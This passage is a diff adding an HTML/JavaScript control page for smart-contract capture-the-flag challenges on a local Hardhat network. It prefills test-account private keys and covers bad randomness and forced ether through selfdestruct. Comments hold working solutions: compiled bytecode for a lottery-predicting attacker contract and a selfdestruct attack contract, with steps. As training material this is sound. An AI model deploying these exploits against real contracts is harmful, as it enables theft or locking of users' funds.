@@ -1,0 +1,1303 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+
+<!-- SHIT AIN'T WORKING :( // In the meantime, just compile with hardhat... -->
+	<!-- The challenges are adapted to solidity 0.5.0 -->
+<!-- <script type="text/javascript" src="https://binaries.soliditylang.org/bin/soljson-v0.5.0+commit.1d4f565a.js"></script> -->
+	<!-- For some reason, Firefox gets suddenly a "too much recursion" error, but with 0.5.1 it loads ok (?) -->
+	<!--<script type="text/javascript" src="https://binaries.soliditylang.org/bin/soljson-v0.5.1+commit.c8a2cb62.js"></script>-->
+
+	<!-- Makes `window.solc` available -->
+<!--	<script type="text/javascript" src="./bundle.js"></script> -->
+<!-- :( -->
+</head>
+<body>
+
+<script>
+
+	let web3 = null;
+	let attackerAddress = null;
+	let attackerPkey = null;
+
+	/* ===== INITIALISATION FUNCTIONS ===== */
+	/* ==== Triggered when clicking the buttons on the "General info" section ==== */
+
+	function connect () {
+
+		document.getElementById ("conn_status").style.background = "white";
+
+		web3 = new Web3 (document.getElementById ("node_conn").value);
+
+		web3.eth.net.isListening().then((s) => {
+			if (s) {
+				document.getElementById ("conn_status").style.background = "green";
+			} else {
+				document.getElementById ("conn_status").style.background = "red";
+			}
+		}).catch((e) => {
+			document.getElementById ("conn_status").style.background = "red";
+		})		
+	}
+
+	function settAttackerAddress () {
+		attackerAddress = document.getElementById ("attacker_address").value;
+	}
+
+	function setPrivateKey () {
+		attackerPkey = document.getElementById ("attacker_pkey").value;
+	}
+
+	/* =================== */
+	
+	/* ===== UTILS ===== */
+	
+	/**
+	 * Creates the contract object and prints the methods in the designated text area
+	 *
+	 * @param addr_id: #id of the element holding the address of the contract
+	 *
+	 * @param abi: object with the ABI-encoded definition of the inputs
+	 *
+	 * @param msg_id: #id of the element where the info will be printed out
+	 *
+	 * @return [contract, addr]
+	 *    Can be easily assigned like: `const [ctf00_contract, CTF00_ADDR] = instantiate_contract (...)
+	 */
+	function instantiate_contract (addr_id, abi, msg_id) {
+
+		const addr = document.getElementById (addr_id).value;
+		const contract = new web3.eth.Contract (abi, addr);
+
+		const description = document.getElementById (msg_id);
+		description.innerHTML = "";
+		
+		if (contract) {
+			
+			let methods = document.createElement ("ul");
+			
+			/* .methods contains the methods in a wide range of formats ("0x...", with just the name, the name with parentheses...), but we only want to show the methods one time */
+			Object.keys (contract.methods)
+				.filter (
+					(k, i) => k.includes("(")
+				).forEach (
+					(k, i) => {
+						let text = document.createElement ("li");
+						text.textContent = k;
+
+						methods.append (text)
+					}
+				);
+
+			description.append (methods);
+
+		} else {
+		
+			let error_msg = document.createElement ("p");
+			error_msg.textContent = "Error geting the contract info :(";
+
+			description.append (error_msg);
+		}
+		
+		return [ addr, contract ]
+	}
+
+	
+	/**
+	 * Generates "n_transactions" transactions between two hardcoded addresses (back-and-forth, to avoid losing too much ether)
+	 * The accounts are the default ones created by Hardhat (account #12 and #16)
+	 */
+	function random_traffic (n_transactions) {
+		const wallet_1 = {
+			"addr": "0x2546bcd3c84621e976d8185a91a922ae77ecec30",
+			"pkey": "0xea6c44ac03bff858b476bba40716402b03e41b8e97e276d1baec7c37d42484a0"
+		};
+		const wallet_2 = {
+			"addr": "0xfabb0ac9d68b0b445fb7357272ff202c5651694a",
+			"pkey": "0xa267530f49f8280200edf313ee7af6b827f2a8bce2897751d06a843f644967b1"
+		};
+
+		/* Base case */
+		if (n_transactions <= 0) {
+			return;
+		}
+
+		from = (n_transactions % 2 == 0)? wallet_1 : wallet_2;
+		to   = (n_transactions % 2 == 0)? wallet_2 : wallet_1;
+
+		web3.eth.accounts.signTransaction (
+			{to: to.addr, gas: "30000", value: "1"},
+			from.pkey
+		).then (
+			signed => web3.eth.sendSignedTransaction (signed.rawTransaction)
+				.on ("receipt", _ => {
+					/* We use recursion here to avoid nonce errors (https://stackoverflow.com/a/56539594) */
+					random_traffic (n_transactions - 1);
+					console.log (`Finished generating transaction. Remaining: ${n_transactions - 1}`);
+				}
+			)
+		);
+	}
+	
+	/**
+	 * Calls the specified method of the designated contract
+	 *
+	 * @param method_id: #id of the DOM element containing the method name (its value will be extracted by this method)
+	 *
+	 * @param args_id: #id of the DOM element containing the argument list (its value will be extracted by this method)
+	 *
+	 * @param contract: instantiated web3.eth.Contract object
+	 *
+	 * @param output: #id of the element where the output will be shown
+	 */
+	function call_contract (method_id, args_id, contract, output) {
+
+		/* When doing "".split(",") or "asdf".split(",") we get [""], so we want to filter out this empty string */
+		let args = document.getElementById (args_id)
+			.value
+			.split (",")
+			.filter (
+				k => k.trim () != ""
+			);
+		
+		let elem = document.getElementById (output);
+		elem.innerHTML = "";
+		elem.style.color = "black";
+
+		try {
+			contract.methods [document.getElementById (method_id).value](...args).call (
+				(err, res) => {
+
+					let output_msg = document.createElement ("p");
+					output_msg.textContent = (typeof res == "object") ? JSON.stringify (res) : res;
+
+					elem.append (output_msg);
+					elem.style.color = "green";
+					
+					console.log (res);
+				}
+			);
+		} catch (err) {
+		
+			let error_msg = document.createElement ("p");
+			error_msg.textContent = err.toString ();
+
+			elem.append (error_msg);
+			elem.style.color = "red";
+			
+			console.error (err);
+		}
+	}
+	
+
+	/**
+	 * Creates a transaction against the specified method of the designated contract.
+	 * The options are automatically set to simply {"from":attackerAddress}, unless "value" is also something else than null
+	 * In that case, {"from":attackerAddress,"value":<VALUE>} will be sent
+	 *
+	 * @param method_id: #id of the DOM element containing the method name (its value will be extracted by this method)
+	 *
+	 * @param args_id: #id of the DOM element containing the argument list (its value will be extracted by this method)
+	 *
+	 * @param contract: instantiated web3.eth.Contract object
+	 *
+	 * @param output: #id of the element where the output will be shown
+	 */
+	function send_to_contract (method_id, args_id, value_id, contract, output) {
+
+		let options = {
+			"from": attackerAddress
+		}
+		
+		let value = document.getElementById (value_id).value
+		if (value != "") {
+			options ["value"] = value
+		}
+
+		/* When doing "".split(",") or "asdf".split(",") we get [""], so we want to filter out this empty string */
+		let args = document.getElementById (args_id)
+			.value
+			.split (",")
+			.filter (
+				k => k.trim () != ""
+			);
+
+		let elem = document.getElementById (output);
+		elem.innerHTML = "";
+		elem.style.color = "black";
+
+		try {
+			contract.methods [document.getElementById (method_id).value](...args).send (
+				options,
+				(err, res) => {
+ 
+					let output_msg = document.createElement ("p");
+					output_msg.textContent = (typeof res == "object") ? JSON.stringify (res) : res;
+
+					elem.append (output_msg);
+					elem.style.color = "green";
+					
+					console.log (res);
+				}
+			);
+		} catch (err) {
+		
+			let error_msg = document.createElement ("p");
+			error_msg.textContent = err.toString ();
+
+			elem.append (error_msg);
+			elem.style.color = "red";
+			
+			console.error (err);
+		}
+	}
+
+
+	/**
+	 * Creates a regular transaction, without actually calling any method of any contract
+	 *
+	 * Prints the result on console
+	 */
+	function regular_tx (from_pkey, to_addr, value) {
+
+		web3.eth.accounts.signTransaction (
+			{to : to_addr, gas: "300000", value: value},
+			from_pkey
+		).then (
+			signed => { web3.eth.sendSignedTransaction(signed.rawTransaction).on ('receipt', console.log) }
+		);
+	}
+
+	/*
+	//  jq '.output.contracts."contracts/Greeter.sol".Greeter.abi' artifacts/build-info/f6d72e584f9c6e176d0b340e8f9097a9.json  -c
+	const GREETER_ABI = [{"inputs":[{"internalType":"string","name":"_greeting","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"greet","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"string","name":"_greeting","type":"string"}],"name":"setGreeting","outputs":[],"stateMutability":"nonpayable","type":"function"}]
+	const GREETER_ADDR = "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512"
+
+	const greeter_contract = new web3.eth.Contract (GREETER_ABI, GREETER_ADDR)
+
+	greeter_contract.methods.setGreeting ("qwer").send (
+		{"from": "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"},
+		function (err, res) {
+			if (err) {
+				console.log("An error occured", err);
+				return;
+			}
+			console.log("Registered transaction: ", res)
+		}
+	);*/
+	
+	/*
+	
+		Create account:
+			web3.eth.accounts.create() 
+	*/
+	
+	/**
+	 * Reads the contents from #shitty_compiler_textarea and tries to compile it
+	 * The output is written to #shitty_compiler_output, as well as on the console
+	 */
+	function compileContract () {
+	
+		var code = document.getElementById ("shitty_compiler_textarea").value;
+		var out_elem = document.getElementById ("shitty_compiler_output");
+
+		try {
+			var compiler_out = window.solc.compile (
+				JSON.stringify (
+					{
+						language: 'Solidity',
+						sources: { 'test.sol': { content: code }},
+						settings: {
+							outputSelection:{'*':{'*': ['*']}}
+						}
+					}
+				)
+			);
+			var parsed_output = JSON.parse (compiler_out);
+			console.log (parsed_output);
+
+			out_elem.innerText = compiler_out;
+
+		} catch (e) {
+			out_elem.innerText = "EXCEPTION: " + e;
+			
+			console.error (e);
+		}
+	}
+
+
+	/**
+	 * Reads the contents of #deployer_abi, #deployer_bytecode and #deployer_args, and tries to deploy the contract
+	 * using `attackerPkey`
+	 */
+	async function deployContract () {
+
+		let result_text = "";
+
+		try {
+			let abi = JSON.parse (document.getElementById ("deployer_abi").value);
+			let bytecode = document.getElementById ("deployer_bytecode").value;
+			/* When doing "".split(",") or "asdf".split(",") we get [""], so we want to filter out this empty string */
+			let args = document.getElementById ("deployer_args")
+				.value
+				.split (",")
+				.filter (
+					k => k.trim () != ""
+				);
+
+			const contract = await new web3.eth.Contract (abi)
+				.deploy ({ data: bytecode, arguments: args })
+				.send ({ gas: "10000000", from: attackerAddress });
+
+			console.log (contract);
+			result_text = "Contract deployed to " + contract._address;
+
+		} catch (e) {
+			console.error (e);
+			result_text = "EXCEPTION: " + e;
+		}
+
+		document.getElementById ("deployer_output").value = result_text;
+	}
+
+</script>
+
+<style>
+body { font-family: sans-serif; }
+h1 { text-align: center; }
+table * {
+	border: 1px solid black;
+	padding: 0.5em;
+}
+#conn_status {
+	width: 5px;
+	height: 5px;
+	background: red;
+	border-radius: 10px;
+}
+.level_methods { border: none }
+.level_methods * {
+	border: none;
+	padding: 0.2em;
+	font-family: monospace;
+}
+</style>
+
+
+<h1>General info</h1>
+
+<table>
+	<tr>
+		<th>Connection</th>
+		<td>
+			<input type="text" id="node_conn" size="80" value="http://192.168.109.131:8545"></input>
+			<button onclick="connect ();">Connect</button>
+			<div id="conn_status"></div>
+		</td>
+	</tr>
+	<tr>
+		<th>Attacker address</th>
+		<td>
+			<input type="text" id="attacker_address" size="80" value="0x70997970C51812dc3A010C7d01b50e0d17dc79C8"></input>
+			<button onclick="settAttackerAddress ();">Set address</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Attacker pkey</th>
+		<td>
+			<input type="text" id="attacker_pkey" size="80" value="0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"></input>
+			<button onclick="setPrivateKey ();">Set key</button>
+		</td>
+	</tr>
+</table>
+
+<hr/>
+
+<h1>Utils</h1>
+
+<table>
+	<tr>
+		<th>Generate random transactions</th>
+		<td>
+			Number of transactions: <input type="text" id="rand_tx_num" size="20" value="100"></input>
+			<button onclick="random_traffic (document.getElementById ('rand_tx_num').value);">Generate (see console for info)</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Regular transaction</th>
+		<td>
+			From (pkey): <input type="text" id="from_pkey" size="80" value="0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"></input><br/>
+			To: <input type="text" id="to_addr" size="80" value="0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512"></input><br/>
+			Value (Wei): <input type="text" id="tx_value" size="69" value="1"></input></br>
+			<button onclick="regular_tx (document.getElementById ('from_pkey').value, document.getElementById ('to_addr').value, document.getElementById ('tx_value').value);">Issue (see console for info)</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Remix IDE</th>
+		<td>
+			<a style="border: none" href="https://remix.ethereum.org">https://remix.ethereum.org</a><br/>
+			<p>To deploy the contract on your Hardhat network: "Deploy and run transactions" (fourth item from the top left) > "Environment" > "Hardhat provider".<br/>
+			Maybe an exception to allow mixed content (on Firefox, click on the TLS padlock and allow insecure content) is needed</p>
+		</td>
+	</tr>
+<!--	<tr>
+		<th>Shitty compiler</th>
+		<td>
+			Enter here your code: <br/>
+			<textarea id="shitty_compiler_textarea" style="width: 80%">
+pragma solidity ^0.5.0;
+
+contract Attacker {
+	<...>
+}
+			</textarea><br/>
+			<button onclick="compileContract ()" >And click here to compile :)</button>
+			<br/>
+			
+			Output:<br/>
+			<textarea readonly="true" id="shitty_compiler_output" style="width: 80%"></textarea>
+		</td>
+	</tr> -->
+		<tr>
+		<th>Deploy smart contract</th>
+		<td>
+			<!-- (can be obtained with `jq ".abi" artifacts/contracts/000-attacker.sol/Caller.json -c` -->
+			JSON interface (ABI): <input id="deployer_abi" style="width: 80%"></input><br/>
+			<!-- `jq ".bytecode" artifacts/contracts/000-attacker.sol/Caller.json -c` -->
+			Bytecode: <input id="deployer_bytecode" style="width: 80%"></input><br/>
+			Constructor arguments (comma separated - leave blank if void): <input id="deployer_args" style="width: 80%"></input><br/>
+			<button onclick="deployContract ()" >Deploy!</button>
+			<br/>
+			
+			Output:<br/>
+			<textarea id="deployer_output" style="width: 80%"></textarea>
+		</td>
+	</tr>
+</table>
+
+<hr/>
+
+<!-- ======================================== -->
+<h1>Vuln 1: Bad Randomness</h1>
+
+<p>
+Pseudorandom number generation on the blockchain is generally unsafe. There are a number of reasons for this, including:
+<ul>
+	<li>The blockchain does not provide any cryptographically secure source of randomness. Block hashes in isolation are cryptographically random, however, a malicious miner can modify block headers, introduce additional transactions, and choose not to publish blocks in order to influence the resulting hashes. Therefore, miner-influenced values like block hashes and timestamps should never be used as a source of randomness.</li>
+    <li>Everything in a contract is publicly visible. Random numbers cannot be generated or stored in the contract until after all lottery entries have been stored.</li>
+    <li>Computers will always be faster than the blockchain. Any number that the contract could generate can potentially be precalculated off-chain before the end of the block.</li>
+</ul>
+A common workaround for the lack of on-chain randomness is using a commit and reveal scheme. Here, each user submits the hash of their secret number. When the time comes for the random number to be generated, each user sends their secret number to the contract which then verifies it matches the hash submitted earlier and xors them together. Therefore no participant can observe how their contribution will affect the end result until after everyone has already committed to a value. However, this is also vulnerable to DoS attacks, since the last person to reveal can choose to never submit their secret. Even if the contract is allowed to move forward without everyone's secrets, this gives them influence over the end result. In general, we do not recommend commit and reveal schemes.
+</p>
+<!--
+	Solution:
+
+	1.- Deploy de malicious contract:
+		ABI: [{"inputs":[{"internalType":"uint256","name":"contract_salt","type":"uint256"}],"payable":true,"stateMutability":"payable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"constant":false,"inputs":[],"name":"play","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]
+		Bytecode: 0x60806040526004361061001e5760003560e01c806393e84cd9146100c7575b61005c6040518060400160405280601a81526020017f5b41545441434b45525d2043616c6c65642066616c6c6261636b0000000000008152506100d1565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156100c4573d6000803e3d6000fd5b50005b6100cf6101cf565b005b6101cc816040516024018080602001828103825283818151815260200191508051906020019080838360005b838110156101185780820151818401526020810190506100fd565b50505050905090810190601f1680156101455780820380516001836020036101000a031916815260200191505b50925050506040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505061048c565b50565b61020d6040518060400160405280601181526020017f5b41545441434b45525d20706c617928290000000000000000000000000000008152506100d1565b600061021960646104b5565b90506102596040518060400160405280601681526020017f5b41545441434b45525d206469636520726f6c6c3a20000000000000000000008152506100d1565b610262816106e7565b61026d6002546106e7565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a88c5ef76040518163ffffffff1660e01b815260040160206040518083038186803b1580156102d757600080fd5b505afa1580156102eb573d6000803e3d6000fd5b505050506040513d602081101561030157600080fd5b810190808051906020019092919050505090506103526040518060400160405280601781526020017f5b41545441434b45525d204e657874207061796f75743a0000000000000000008152506100d1565b61035b816106e7565b6000600a838161036757fe5b0614156104885761038f6040518060600160405280603081526020016108f9603091396100d1565b600060606000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600184016207a12090604051806000019050600060405180830381858888f193505050503d806000811461041b576040519150601f19603f3d011682016040523d82523d6000602084013e610420565b606091505b5091509150811561045a5761044c6040518060600160405280602a81526020016108cf602a91396100d1565b61045581610780565b610485565b61047b6040518060600160405280602d81526020016108a2602d91396100d1565b61048481610780565b5b50505b5050565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b60006104f56040518060400160405280601381526020017f5b41545441434b45525d2072616e646f6d2829000000000000000000000000008152506100d1565b6000826064600254028161050557fe5b0490506000600160056002548161051857fe5b060143600254028161052657fe5b049050600060016064838161053757fe5b0660646002548161054457fe5b064303030390506000814060001c9050610575604051806060016040528060238152602001610929602391396100d1565b6105806002546106e7565b6105be6040518060400160405280601981526020017f5b41545441434b45525d20626c6f636b2e6e756d6265723a20000000000000008152506100d1565b6105c7436106e7565b6106056040518060400160405280601081526020017f5b41545441434b45525d204d61783a20000000000000000000000000000000008152506100d1565b61060e866106e7565b61064c6040518060400160405280600e81526020017f5b41545441434b45525d20793a200000000000000000000000000000000000008152506100d1565b610655836106e7565b6106936040518060400160405280601181526020017f5b41545441434b45525d20736565643a200000000000000000000000000000008152506100d1565b61069c826106e7565b6106bd60405180606001604052806023815260200161087f602391396100d1565b6106c6816106e7565b6001868583816106d257fe5b04816106da57fe5b0601945050505050919050565b61077d81604051602401808281526020019150506040516020818303038152906040527ff82c50f1000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505061048c565b50565b61087b816040516024018080602001828103825283818151815260200191508051906020019080838360005b838110156107c75780820151818401526020810190506107ac565b50505050905090810190601f1680156107f45780820380516001836020036101000a031916815260200191505b50925050506040516020818303038152906040527f0be77f56000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505061048c565b5056fe5b41545441434b45525d20626c6f636b2e626c6f636b68617368202873656564293a205b41545441434b45525d205468652077696e6e696e67207472616e73616374696f6e206661696c656420283f295b41545441434b45525d20576520776f6e202121212028776861742061207375727072697365205844295b41545441434b45525d2028726f6c6c202520313029203d203020212121212121202d3e20506c6163652027626574275b41545441434b45525d2053616c742028626c6f636b2e74696d657374616d70293a20a265627a7a72315820b45cf3744df04b06ba8899ab1a9f06011afb1219b1d2a9c9fe1f52f07873d2b264736f6c63430005110032
+		Args: (get the seed with `web3.eth.getBlock (1).then (block => console.log (block.timestamp));` )
+	
+	2.- Call the malicious contract's method "play()" until you win ;)
+-->
+<table>
+	<tr>
+		<th>Contract address</th>
+		<td>
+			<input type="text" id="ctf_00_addr" size="80" value="0x5FbDB2315678afecb367f032d93F642f64180aa3"></input>
+			<button onclick="create_00 ();">Instantiate (WARNING: creates 256 random transactions!)</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract methods</th>
+		<td>
+			<div id="ctf_00_methods" class="level_methods" ></div>
+		</td>
+	</tr>
+	<tr>
+		<th>Call contract (no state alter)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_00_call_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_00_call_args" size="59" value=""></input><br/>
+			<button onclick="call_contract ('ctf_00_call_method', 'ctf_00_call_args', ctf00_contract, 'ctf_00_output')">Call</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Send to contract (alters state)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_00_send_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_00_send_args" size="59" value=""></input><br/>
+			Value (Wei): <input type="text" id="ctf_00_value" size="75" value=""></input><br/>
+			<button onclick="send_to_contract ('ctf_00_send_method', 'ctf_00_send_args', 'ctf_00_value', ctf00_contract, 'ctf_00_output')">Send</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract output</th>
+		<td>
+			<div id="ctf_00_output"></div>
+		</td>
+	</tr>
+</table>
+
+<table>
+	<tr>
+		<th>(ATTACKER!) Contract address</th>
+		<td>
+			<input type="text" id="ctf_00_attacker_addr" size="80" value="0x00"></input>
+			<button onclick="create_00_attacker ();">Instantiate</button>
+		</td>
+	</tr>
+	<tr>
+		<th>(ATTACKER!) Contract methods</th>
+		<td>
+			<div id="ctf_00_attacker_methods" class="level_methods" ></div>
+		</td>
+	</tr>
+<!--	<tr>
+		<th>(ATTACKER!) Call contract (no state alter)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_00_attacker_call_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_00_attacker_call_args" size="59" value=""></input><br/>
+			<button onclick="call_contract ('ctf_00_attacker_call_method', 'ctf_00_attacker_call_args', ctf00_attacker_contract, 'ctf_00_attacker_output')">Call</button>
+		</td>
+	</tr> -->
+	<tr>
+		<th>(ATTACKER!) Send to contract (alters state)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_00_attacker_send_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_00_attacker_send_args" size="59" value=""></input><br/>
+			Value (Wei): <input type="text" id="ctf_00_attacker_value" size="75" value=""></input><br/>
+			<button onclick="send_to_contract ('ctf_00_attacker_send_method', 'ctf_00_attacker_send_args', 'ctf_00_attacker_value', ctf00_attacker_contract, 'ctf_00_attacker_output')">Send</button>
+		</td>
+	</tr>
+	<tr>
+		<th>(ATTACKER!) Contract output</th>
+		<td>
+			<div id="ctf_00_attacker_output"></div>
+		</td>
+	</tr>
+</table>
+
+<script>
+const CTF00_ABI = [{"constant":true,"inputs":[],"name":"WatchFees","outputs":[{"name":"CollectedFees","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_owner","type":"address"}],"name":"ChangeOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"id","type":"uint256"}],"name":"PlayerInfo","outputs":[{"name":"Address","type":"address"},{"name":"Payout","type":"uint256"},{"name":"UserPaid","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"WatchWinningPot","outputs":[{"name":"pot","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"CollectAllFees","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"PayoutQueueSize","outputs":[{"name":"QueueSize","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"NextPayout","outputs":[{"name":"next","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"p","type":"uint256"}],"name":"GetAndReduceFeesByFraction","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"WatchLastPayout","outputs":[{"name":"payout","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"WatchBalance","outputs":[{"name":"TotalBalance","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"Total_of_Players","outputs":[{"name":"NumberOfPlayers","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"WatchBalanceInEther","outputs":[{"name":"TotalBalanceInEther","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":false,"stateMutability":"nonpayable","type":"fallback"}]
+let CTF00_ADDR = null;
+let ctf00_contract = null;
+
+function ctf00_random_bet () {
+
+	let CTF00_ADDR = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
+	let wallet_1 = {
+		"addr": "0xcd3B766CCDd6AE721141F452C550Ca635964ce71",
+		"pkey": "0x8166f546bab6da521a8369cab06c5d2b9e46670292d85c875ee9ec20e84ffb61"
+	};
+
+	ctf00_contract.methods.NextPayout ().call ( (err, res) => {
+
+    if (res) {
+    	console.log ("Last payout: " + web3.utils.fromWei (res) + " ETH");
+  	} else {
+      console.log ("No payout yet");
+    }
+		let dummy_acc = web3.eth.accounts.create ();
+		let value = web3.utils.toBN (
+		  res? res : web3.utils.toWei ("1", "ether")
+		);
+		console.log (value.toString ());
+
+		web3.eth.accounts.signTransaction (
+			{
+				to: dummy_acc.address,
+				gas: "30000",
+				value: value.add (
+				  web3.utils.BN ( web3.utils.BN ( web3.utils.toWei ("100", "finney") ) )
+				)
+			},
+			wallet_1.pkey
+		).then (
+			signed => web3.eth.sendSignedTransaction (signed.rawTransaction)
+				.on ("receipt", _ => {
+					web3.eth.accounts.signTransaction (
+						{
+							to : CTF00_ADDR,
+							gas: "10000000",
+							value: value.add (
+								web3.utils.BN ( "1" )
+							)
+						},
+						dummy_acc.privateKey
+					).then (
+						signed => { web3.eth.sendSignedTransaction(signed.rawTransaction).on ('receipt', console.log) }
+					);
+				})
+		);
+	});
+};
+
+function create_00 () {
+	[ CTF00_ADDR, ctf00_contract ]  = instantiate_contract ('ctf_00_addr', CTF00_ABI, 'ctf_00_methods');
+	/* For random() to not error-out */
+	random_traffic (256);
+
+	/* To initiate the jackpot */
+	ctf00_random_bet ();
+}
+
+const CTF00_attacker_ABI = [{"constant":false,"inputs":[],"name":"play","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"inputs":[{"name":"contract_salt","type":"uint256"}],"payable":true,"stateMutability":"payable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"}]
+let CTF00_attacker_ADDR = null;
+let ctf00_attacker_contract = null;
+
+function create_00_attacker () {
+	[ CTF00_attacker_ADDR, ctf00_attacker_contract ]  = instantiate_contract ('ctf_00_attacker_addr', CTF00_attacker_ABI, 'ctf_00_attacker_methods');
+}
+
+</script>
+
+
+<hr/>
+
+<!-- ======================================== -->
+
+<h1>Vuln 3: Contracts can be forced to receive ether</h1>
+
+<p>
+In certain circunstances, contracts can be forced to receive ether without triggering any code. This should be considered by the contract developers in order to avoid breaking important invariants in their code.
+</p>
+<!--
+	Solution:
+
+	1.- Deploy the following contract:
+pragma solidity ^0.5.0;
+
+import "hardhat/console.sol";
+
+contract SelfDestructor {
+
+    function attack (address payable targetAddress) payable public {
+        selfdestruct (targetAddress);
+    }
+}
+	2.- Call `attack()` using the victim address as a target and see how the owner can't retrieve the funds anymore XD
+-->
+<table>
+	<tr>
+		<th>Contract address</th>
+		<td>
+			<input type="text" id="ctf_03_addr" size="80" value="0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512"></input>
+			<button onclick="create_03 ();">Instantiate</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract methods</th>
+		<td>
+			<div id="ctf_03_methods" class="level_methods" ></div>
+		</td>
+	</tr>
+	<tr>
+		<th>Call contract (no state alter)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_03_call_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_03_call_args" size="59" value=""></input><br/>
+			<button onclick="call_contract ('ctf_03_call_method', 'ctf_03_call_args', ctf03_contract, 'ctf_03_output')">Call</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Send to contract (alters state)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_03_send_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_03_send_args" size="59" value=""></input><br/>
+			Value (Wei): <input type="text" id="ctf_03_value" size="75" value=""></input><br/>
+			<button onclick="send_to_contract ('ctf_03_send_method', 'ctf_03_send_args', 'ctf_03_value', ctf03_contract, 'ctf_03_output')">Send</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract output</th>
+		<td>
+			<div id="ctf_03_output"></div>
+		</td>
+	</tr>
+</table>
+
+<table>
+	<tr>
+		<th>(ATTACKER!) Contract address</th>
+		<td>
+			<input type="text" id="ctf_03_attacker_addr" size="80" value="0x00"></input>
+			<button onclick="create_03_attacker ();">Instantiate</button>
+		</td>
+	</tr>
+	<tr>
+		<th>(ATTACKER!) Contract methods</th>
+		<td>
+			<div id="ctf_03_attacker_methods" class="level_methods" ></div>
+		</td>
+	</tr>
+	<tr>
+		<th>(ATTACKER!) Send to contract (alters state)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_03_attacker_send_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_03_attacker_send_args" size="59" value=""></input><br/>
+			Value (Wei): <input type="text" id="ctf_03_attacker_value" size="75" value=""></input><br/>
+			<button onclick="send_to_contract ('ctf_03_attacker_send_method', 'ctf_03_attacker_send_args', 'ctf_03_attacker_value', ctf03_attacker_contract, 'ctf_03_attacker_output')">Send</button>
+		</td>
+	</tr>
+	<tr>
+		<th>(ATTACKER!) Contract output</th>
+		<td>
+			<div id="ctf_03_attacker_output"></div>
+		</td>
+	</tr>
+</table>
+
+<script>
